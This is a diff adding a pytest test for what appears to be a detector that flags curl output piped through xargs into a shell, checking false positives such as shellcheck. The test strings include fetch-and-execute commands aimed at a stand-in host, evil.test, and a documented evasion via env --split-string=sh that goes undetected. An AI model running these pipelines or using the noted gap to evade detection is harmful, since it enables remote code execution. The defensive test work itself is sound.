@@ -48,6 +48,21 @@ def test_sh_file_extension_and_script_operands_are_not_matched():
     assert _host("curl -s https://example.com/f | xargs -n1 bash build.sh --coverage") is None
 
 
+def test_shell_token_in_an_option_value_is_not_a_command():
+    # C-135 FP: `shellcheck --shell=sh -C` is a lint command, not a shell exec -- the
+    # `sh` sits in the `--shell=sh` OPTION VALUE (preceded by `=`), not command position.
+    assert _host(
+        "curl -s https://list.example.test/l | xargs -n1 shellcheck --shell=sh -C"
+    ) is None
+    # a real `sh` in command position carrying a --shell option is still caught.
+    assert _host("curl -s https://evil.test/u | xargs sh --shell=bash -c {}") == "evil.test"
+    # the plain env wrapper (shell NOT after `=`) is still caught...
+    assert _host("curl -s https://evil.test/u | xargs env sh -c {}") == "evil.test"
+    # ...but a shell reached through env's --split-string= option value is a documented
+    # ceiling (same option-grammar class), not matched -- the cost of the shellcheck FP fix.
+    assert _host("curl -s https://evil.test/u | xargs env --split-string=sh -c {}") is None
+
+
 def test_option_with_separate_value_before_c_is_the_declared_ceiling():
     # documented ceiling (option-arity): a `-c` reached only past an option that takes a
     # separate VALUE word is not matched -- telling the value apart from a script operand
